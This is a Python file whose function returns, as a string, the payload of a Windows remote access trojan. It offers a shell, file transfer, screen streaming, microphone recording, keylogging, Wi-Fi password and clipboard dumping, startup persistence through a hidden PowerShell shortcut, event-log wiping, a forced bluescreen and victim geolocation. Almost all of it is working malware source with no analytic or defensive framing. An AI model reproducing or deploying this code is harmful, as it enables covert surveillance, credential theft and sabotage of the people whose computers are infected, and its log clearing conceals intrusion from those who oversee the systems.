


def sparload():

    return r'''
  
is_muted = False





VK_CODE = {
        'a': 0x41, 'b': 0x42, 'c': 0x43, 'd': 0x44, 'e': 0x45, 'f': 0x46,
        'g': 0x47, 'h': 0x48, 'i': 0x49, 'j': 0x4A, 'k': 0x4B, 'l': 0x4C,
        'm': 0x4D, 'n': 0x4E, 'o': 0x4F, 'p': 0x50, 'q': 0x51, 'r': 0x52,
        's': 0x53, 't': 0x54, 'u': 0x55, 'v': 0x56, 'w': 0x57, 'x': 0x58,
        'y': 0x59, 'z': 0x5A, '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33,
        '4': 0x34, '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,
        ' ': 0x20, '.': 0xBE, ',': 0xBC, '!': 0x31, '?': 0xBF
    }

def press_key(hexKeyCode):
        ctypes.windll.user32.keybd_event(hexKeyCode, 0, 0, 0)
        sleep(0.01)
        ctypes.windll.user32.keybd_event(hexKeyCode, 0, 2, 0)

def keyboard_send(text):
        for char in text:
            key = char.lower()
            shift = char.isupper() or char in "!?"
            if shift:
                press_key(0x10)  
            if key in VK_CODE:
                press_key(VK_CODE[key])
            else:
                pass 
            if shift:
                ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)  
            sleep(0.02) 
        return "[+] The keys have been sent."    

def on_press(key):
        global logged_keys
        try:
            logged_keys += key.char
        except AttributeError:
            logged_keys += f'[{key.name}]'








def receive_uploaded_file(sock):
        try:
        
            name_len_bytes = sock.recv(4)
            if len(name_len_bytes) < 4:
                return "[!] Failed to receive filename length"
            name_len = int.from_bytes(name_len_bytes, 'big')
            
            
            file_name_bytes = b""
            while len(file_name_bytes) < name_len:
                chunk = sock.recv(name_len - len(file_name_bytes))
                if not chunk:
                    return "[!] Failed to receive complete filename"
                file_name_bytes += chunk
            file_name = file_name_bytes.decode(errors='ignore')
            
            
            size_bytes = sock.recv(8)
            if len(size_bytes) < 8:
                return "[!] Failed to receive file size"
            file_size = int.from_bytes(size_bytes, 'big')
            
            
            
            save_path = path.join(file_name)
            
            
            received = 0
            with open(save_path, 'wb') as f:
                while received < file_size:
                    chunk = sock.recv(min(4096, file_size - received))
                    if not chunk:
                        return f"[!] Connection lost while receiving {file_name}"
                    f.write(chunk)
                    received += len(chunk)
            
            
            
            return f"ACK_FILE_UPLOAD_COMPLETE"
        
        except Exception as e:
            return f"[!] Error receiving uploaded file: {e}"

def send_file(sock, path1):
        try:
            if not path.exists(path1):
                sock.sendall(b"[!] File or folder not found")
                return

            files_to_send = []
            if path.isfile(path1):
                files_to_send.append(path1)
            else:
                for root, _, files in walk(path1):
                    for file in files:
                        full_path = path.join(root, file)
                        relative_path = path.relpath(full_path, start=path1)
                        files_to_send.append((full_path, relative_path))

            sock.sendall(len(files_to_send).to_bytes(4, 'big'))

            for entry in files_to_send:
                if isinstance(entry, str):
                    full_path = entry
                    relative_path = path.basename(entry)
                else:
                    full_path, relative_path = entry

                file_size = path.getsize(full_path)
                relative_name_bytes = relative_path.encode()
                sock.sendall(len(relative_name_bytes).to_bytes(4, 'big'))
                sock.sendall(relative_name_bytes)
                sock.sendall(file_size.to_bytes(8, 'big'))

                with open(full_path, 'rb') as f:
                    while chunk := f.read(4096):
                        sock.sendall(chunk)

        
            return 0
        except Exception as e:
            return f"[!] Error sending: {e}"



        



def record_mic(time, sock):
        SAMPLE_RATE = 44100
        CHUNK = 1024
        FORMAT = paInt16
        CHANNELS = 1

        audio = PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=SAMPLE_RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = [stream.read(CHUNK) for _ in range(int(SAMPLE_RATE / CHUNK * time))]

        stream.stop_stream()
        stream.close()
        audio.terminate()

        fd, path = tempfile.mkstemp(suffix=".wav")
        close(fd)

        wf = wave_open(path, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(SAMPLE_RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        with open(path, 'rb') as f:
            audio_data = f.read()
            sock.sendall(audio_data)

        remove(path)

        
def stream_screen(sock):


        stop_streaming = False

        def listen_for_stop():
            nonlocal stop_streaming
            while not stop_streaming:
                try:
                    cmd = sock.recv(1024).decode()
                    if cmd == "stopstream":
                        stop_streaming = True
                        break
                except:
                    break

        threading.Thread(target=listen_for_stop, daemon=True).start()

        try:
            with mss.mss() as sct:
                temp_dir = path.join(getenv('LOCALAPPDATA'), 'ScreenTemp')
                makedirs(temp_dir, exist_ok=True)
                temp_img_path = path.join(temp_dir, 'screenshot.png')

                while True:
                    if stop_streaming:
                        break

                    try:
                        screenshot = sct.grab(sct.monitors[1])

                        if stop_streaming:
                            break  

                        mss.tools.to_png(screenshot.rgb, screenshot.size, output=temp_img_path)

                        if stop_streaming:
                            break  

                        with open(temp_img_path, 'rb') as f:
                            img_bytes = f.read()

                        if stop_streaming:
                            break  

                        sock.sendall(len(img_bytes).to_bytes(8, 'big'))
                        sock.sendall(img_bytes)
                    except:
                        break


                    for _ in range(4):
                        if stop_streaming:
                            break
                        sleep(0.1)

        except:
            pass      

def execute_shell(cmd):
        try:
            result = popen(cmd).read()
            return result if result else "[+] Command executed with no output."
        except Exception as e:
            return f"[!] {e}"

def kill_process(identifier):
        try:
            if identifier.isdigit():
                result = subprocess.run(["taskkill", "/PID", identifier, "/F"], capture_output=True, text=True)
            else:
                result = subprocess.run(["taskkill", "/IM", identifier, "/F"], capture_output=True, text=True)

            if result.returncode == 0:
                return f"[+] Process {identifier} terminated"
            else:
                return f"[!] Failed: {result.stderr.strip()}"
        except Exception as e:
            return f"[!] Exception: {e}"

def list_processes():
        try:
            output = subprocess.check_output(["tasklist"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return output.decode('utf-8', errors='ignore')  
        except Exception as e:
            return f"[!] {e}"



def take_screenshot_send(sock):
        try:
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            
            sock.sendall(len(img_bytes).to_bytes(8, 'big'))
            sock.sendall(img_bytes)
            

        except Exception as e:
            pass
        
def show_message(text, title="Message"):
        ctypes.windll.user32.MessageBoxW(0, text, title, 1)


def handel_command(command):

        if command.startswith("cd "):
            try:
                chdir(command[3:])
                path = getcwd()
                return f"[+] Path changed to {path}"
            except Exception as e:
                return f"[!] {e}"

        elif command.startswith("mkdir "):
            try:
                mkdir(command[6:])
                return f"[+] directory was created successfully '{command[6:]}'."
            except Exception as e:
                return f"[!] {e}"
                
        elif command.startswith("rmdir "):
            try:
                rmdir(command[6:])
                return f"[+] directory was removed successfully '{command[6:]}'."
            except Exception as e:
                return f"[!] {e}"
                
        elif command.startswith("touch "):
            try:
                with open(command[6:], 'a'):
                    utime(command[6:], None)
                return f"[+] file was created successfully '{command[6:]}'"
            except Exception as e:
                return f"[!] {e}"

        elif command.startswith("rm "):
            try:
                remove(command[3:])
                return f"[+] file was removed successfully '{command[3:]}'"
            except Exception as e:
                return f"[!] {e}"
                
        elif command.startswith("echo "):
            try:
                if ">" in command:
                    parts = command[5:].split(">", 1)
                    text = parts[0].strip()
                    filename = parts[1].strip()
                else:
                    parts = command[5:].rsplit(" ", 1)
                    if len(parts) != 2:
                        return "[!] Usage: echo <text> > <filename> OR echo <text> <filename>"
                    text = parts[0].strip()
                    filename = parts[1].strip()
                with open(filename, "w") as f:
                    f.write(text + "\n")
                return f"[+] Wrote to file '{filename}'"
            except Exception as e:
                return f"[!] {e}"
                
        elif command.startswith("cp "):
            try:
                parts = command[3:].split(" ")
                if len(parts) != 2:
                    return "[!] Usage: cp <source> <destination>"
                copy(parts[0], parts[1])
                return f"[+] File copied from {parts[0]} to {parts[1]}"
            except Exception as e:
                return f"[!] {e}"
                
        elif command.startswith("mv "):
            try:
                parts = command[3:].split(" ")
                if len(parts) != 2:
                    return "[!] Usage: mv <source> <destination>"
                move(parts[0], parts[1])
                return f"[+] File moved from {parts[0]} to {parts[1]}"
            except Exception as e:
                return f"[!] {e}"
                
        elif command.startswith("rename "):
            try:
                parts = command[7:].split(" ")
                if len(parts) != 2:
                    return "[!] Usage: rename <old_name> <new_name>"
                rename(parts[0], parts[1])
                return f"[+] Renamed {parts[0]} to {parts[1]}"
            except Exception as e:
                return f"[!] {e}"
                
        elif command.strip() == "date" or command.strip() == "time":
            return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
        elif command.strip() == "locations":
            try:
                with urllib.request.urlopen("http://ip-api.com/json/") as response:
                    data = json.loads(response.read().decode())
                    if data["status"] == "success":
                        lat = data["lat"]
                        lon = data["lon"]
                        city = data.get("city", "")
                        country = data.get("country", "")
                        link = f"https://www.google.com/maps?q={lat},{lon}"
                        return (f"[+] Location info:\n"
                                f"    - Country: {country}\n"
                                f"    - City: {city}\n"
                                f"    - Latitude: {lat}\n"
                                f"    - Longitude: {lon}\n"
                                f"    - Google Maps: {link}")
                    else:
                        return "[!] Failed to retrieve location"
            except Exception as e:
                return f"[!] {e}"

            
        
            
        elif command.strip() == "pwd":
            return getcwd()
        
        elif command.strip() == "list_drives":
            drives_info = ""
            partitions = psutil.disk_partitions(all=False)
            for partition in partitions:
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    drives_info += f"{partition.device} — Total: {usage.total // (1024**3)}GB, Free: {usage.free // (1024**3)}GB\n"
                except PermissionError:
                    drives_info += f"{partition.device} — Access Denied\n"
            return f"""{drives_info.strip()}"""
        
        elif command.strip() == "list_users":
            try:
                output = subprocess.check_output("net user", shell=True, text=True)
                return output 
            except Exception as e:
                return f"Error: {e}"
            
        elif command.strip() == "systeminfo":
            info = f"""
    [System Information]
    Platform   : {platform()}
    System     : {sys_name()}
    Release    : {release()}
    Version    : {version()}
    Machine    : {machine()}
    Processor  : {processor()}
    Node Name  : {node()}
    """
            return info
            
            
        elif command.strip() == "whoami":
            return popen("whoami").read().strip()
            
        elif command.strip() == "bluescreen":
            response = ctypes.c_ulong()
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(response))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(response))
            return "[+] Bluescreen is activate"
            
        elif command.startswith("openurl "):
            try:
                openurl(command[8:])
                return "[+] The link has been opened"
            except Exception as e:
                return f"[!] {e}"
                
        elif command.strip() == "ls":
            try:
                items = listdir(".")
                if not items:
                    return "No files or directories found"
                return "\n".join(sorted(items))
            except Exception as e:
                return f"Error listing files: {e}"


                
        elif command.startswith("showtxt "):
            threading.Thread(target=show_message, args=(command[8:],), daemon=True).start()
            return "[+] The message is displayed"
            
        elif command.strip() == "shutdown":
            try:
                system("shutdown /s /t 1")
                return "[+] Shutdown command sent."
            except Exception as e:
                return f"[!] {e}"
            
        elif command.strip() == "reboot":
            try:
                system("shutdown /r /t 1")
                return "[+] Reboot command sent."
            except Exception as e:
                return f"[!] {e}"
            
        elif command.strip() == "monitor_off":
            try:
            
                HWND_BROADCAST = 0xFFFF
                WM_SYSCOMMAND = 0x0112
                SC_MONITORPOWER = 0xF170
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        
                return "[+] Screen turned off"
            except Exception as e:
                return f"[!] {e}"
        elif command.strip() == "monitor_on":
            try:
            
                HWND_BROADCAST = 0xFFFF
                WM_SYSCOMMAND = 0x0112
                SC_MONITORPOWER = 0xF170
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
                return "[+] Screen turned on"
            except Exception as e:
                return f"[!] {e}"    
            
        elif command.startswith("say "):
            text = command[4:]  
            ps_command = f"Add-Type -AssemblyName System.Speech; " \
                        f"(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{text}');"
            subprocess.run(
                ["powershell", "-Command", ps_command],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return f"[+] Said: {text}"

            
        elif command.startswith("exec "):
            return execute_shell(command[5:])
            
        elif command.startswith("kill "):
            result = kill_process(command[5:].strip())

            
            return result
            
        elif command.strip() == "listproc":
            return list_processes()
        elif command.strip() == "autostartup":
                charss = ['a','b','c','d','e','f','g','s','v','q','j', '1', '2', '4']
                exe_path = executable if getattr(sys, 'frozen', False) else os.path.abspath(argv[0])
                shortcut_name = choice(charss) + ".lnk"
                startup_folder = os.path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                shortcut_path = os.path.join(startup_folder, shortcut_name)

                try:
                    powershell_cmd = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut(\'{shortcut_path}\');$s.TargetPath=\'{exe_path}\';$s.WorkingDirectory=\'{os.path.dirname(exe_path)}\';$s.IconLocation=\'{exe_path}\';$s.Save()"'
                    return("[+] Autostart enabled the program will now launch at system startup.")

                except:
                    return "[!] Failed to create startup shortcut."
        elif command.strip() == "keylogger_start":
                listener = keyboard.Listener(on_press=on_press)
                listener.start()  
                return "[+] Key logger started"
        elif command.strip() == "keylogger_dump":
            if logged_keys == "":
                return "[-] No keys logged"
            return logged_keys
        elif command.strip() == "close":
            _exit(0)    

        elif command.startswith("keyboard_send "):
            text = command[14:]
            return keyboard_send(text)

        elif command.startswith("get_fileinfo "):
            try:
                filepath = command.split(" ", 1)[1]
                if not os.path.exists(filepath):
                    return "[!] File does not exist"

                stats = os.stat(filepath)
                file_type = "Directory" if os.path.isdir(filepath) else "File" if os.path.isfile(filepath) else "Other"

                info = {
                    "Type": file_type,
                    "Size": f"{stats.st_size} bytes",
                    "Created": time.ctime(stats.st_ctime),
                    "Modified": time.ctime(stats.st_mtime),
                    "Accessed": time.ctime(stats.st_atime),
                }
                return "\n".join([f"{k}: {v}" for k, v in info.items()])
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "wifi_passwords":
                try:
                    result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
                    profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
                    output = ""
                    for profile in profiles:
                        password_info = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True).decode()
                        for line in password_info.splitlines():
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                output += f"{profile}: {password}\n"
                                break
                        else:
                            output += f"{profile}: [NO PASSWORD FOUND]\n"
                    return output if output else "[!] No saved WiFi networks found"
                except Exception as e:
                    return f"[!] {e}"
        elif command.strip() == "clipboard_dump":
                try:
                    data = pypaste()
                    if data:
                        return f"[+] Clipboard content:\n{data}"
                    return "[-] Clipboard is empty"
                except Exception as e:
                    return f"[!] {e}"
        elif command.startswith("clipboard_set "):
            return clipboard_set(command[14:].strip())
        elif command.strip() == "mouse_flip": 
            ctypes.windll.user32.SwapMouseButton(1)
            return "[+] The mouse is flipped"
        elif command.strip() == "toggle_taskbar":
                taskbar = FindWindow("Shell_TrayWnd", None)
                is_visible = IsWindowVisible(taskbar)
                
                if is_visible:
                    ShowWindow(taskbar, SW_HIDEEX)
                    return "[+] The taskbar is hidden"
                else:
                    ShowWindow(taskbar, SW_SHOW)
                    return "[+] The taskbar is shown"


        elif command.strip() == "open_cd":
            try:
                ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
                return "[+] CD tray opened successfully."
            except Exception as e:
                return f"[!] Failed to open CD tray: {e}"

        elif command.strip() == "close_cd":
            try:
                ctypes.windll.WINMM.mciSendStringW("set cdaudio door closed", None, 0, None)
                return "[+] CD tray closed successfully."
            except Exception as e:
                return f"[!] Failed to close CD tray: {e}"  

        elif command.strip() == "toggle_icons":
            progman = ctypes.windll.user32.FindWindowW("Progman", None)
            desktop = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)

            if not desktop:
                workerw = ctypes.windll.user32.FindWindowExW(0, 0, "WorkerW", None)
                while workerw:
                    shellview = ctypes.windll.user32.FindWindowExW(workerw, 0, "SHELLDLL_DefView", None)
                    if shellview:
                        desktop = shellview
                        break
                    workerw = ctypes.windll.user32.FindWindowExW(0, workerw, "WorkerW", None)

            if not desktop:
                return "[!] Could not find desktop view."

            listview = ctypes.windll.user32.FindWindowExW(desktop, 0, "SysListView32", None)
            if not listview:
                return "[!] Could not find icons list."

    
            is_visible = ctypes.windll.user32.IsWindowVisible(listview)


            ctypes.windll.user32.SendMessageW(desktop, 0x111, 0x7402, 0)


            new_visibility = ctypes.windll.user32.IsWindowVisible(listview)

            if new_visibility != is_visible:
                if new_visibility:
                    return "[+] Desktop icons shown."
                else:
                    return "[+] Desktop icons hidden."
            else:
                return "[!] Icon visibility did not change."
        elif command.strip() == "ipconfig":      
                try:
                    result = subprocess.check_output("ipconfig", shell=True, text=True)
                    return result
                except Exception as e:
                    return f"[!] Failed to run ipconfig: {e}"
        elif command.strip() == "netstat":            
            try:
                result = subprocess.check_output("netstat -ano", shell=True, text=True)
                return result
            except Exception as e:
                return f"[!] Failed to run netstat: {e}"

        elif command.strip() == "is_admin":
            try:

                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return "[+] Admin privileges detected" if is_admin else "[-] Not running as admin"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "windows_list":
            try:

                titles = []

                def enum_handler(hwnd, _):
                    if IsWindowVisible(hwnd):
                        title = GetWindowText(hwnd)
                        if title:
                            titles.append(title)

                EnumWindows(enum_handler, None)
                return "\n".join(titles) if titles else "[-] No visible windows found"
            except Exception as e:
                return f"[!] {e}"

        elif command.startswith("window_minimize "):
            try:

                title = command[16:]
                hwnd = FindWindow(None, title)
                ShowWindow(hwnd, SW_MINIMIZE)
                return "[+] Window minimized"
            except Exception as e:
                return f"[!] {e}"

        elif command.startswith("window_maximize "):
            try:
    
                title = command[16:]
                hwnd = FindWindow(None, title)
                ShowWindow(hwnd, SW_MAXIMIZE)
                return "[+] Window maximized"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "uptime":
            try:

                boot_time = psutil.boot_time()
                uptime_seconds = time.time() - boot_time
                uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))
                return f"[+] Uptime: {uptime_str}"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "resolution":
            try:

                user32 = ctypes.windll.user32
                width = user32.GetSystemMetrics(0)
                height = user32.GetSystemMetrics(1)
                return f"[+] Resolution: {width}x{height}"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "clear_logs":
            try:
            
                system("wevtutil cl System")
                system("wevtutil cl Security")
                system("wevtutil cl Application")
                return "[+] Event logs cleared"
            except Exception as e:
                return f"[!] {e}"

        elif command.startswith("window_focus "):
            try:

                title = command[13:]
                hwnd = FindWindow(None, title)
                SetForegroundWindow(hwnd)
                return "[+] Window focused"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "arp_table":
            try:
        
                result = subprocess.check_output("arp -a", shell=True).decode()
                return result if result else "[-] No ARP entries found"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "cpu_usage":
            try:
                usage = psutil.cpu_percent(interval=1)
                return f"[+] CPU Usage: {usage}%"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "ram_usage":
            try:
                ram = psutil.virtual_memory()
                return f"[+] RAM Usage: {ram.percent}% ({ram.used // (1024**2)}MB / {ram.total // (1024**2)}MB)"
            except Exception as e:
                return f"[!] {e}"

        elif command.strip() == "disk_usage":
            try:
            
                disk = psutil.disk_usage('/')
                return f"[+] Disk Usage: {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)"
            except Exception as e:
                return f"[!] {e}"     


        

    

        elif command.strip() == "toggle_volume":
                global is_muted
                try:
                        hwnd = ctypes.windll.user32.GetForegroundWindow()
                        ctypes.windll.user32.SendMessageW(hwnd, 0x319, hwnd, 0x80000)

                        is_muted = not is_muted  

                        if is_muted:
                            return "[+] System volume muted"
                        else:
                            return "[+] System volume unmuted"
                except Exception as e:
                        return f"[!] {e}"


        elif command.startswith("event_logs "):
            try:
                log_type = command.split(" ", 1)[1]
                output = subprocess.check_output(
                    ["wevtutil", "qe", log_type, "/c:10", "/f:text"],
                    stderr=subprocess.STDOUT,
                    text=True
                )
                return output[:3000] if len(output) > 3000 else output 
            except subprocess.CalledProcessError as e:
                return f"[!] Error reading event log: {e.output}"
            except Exception as e:
                return f"[!] {e}"                         
        else:
            return f"[-] Command not found '{command}' Try help"
        '''



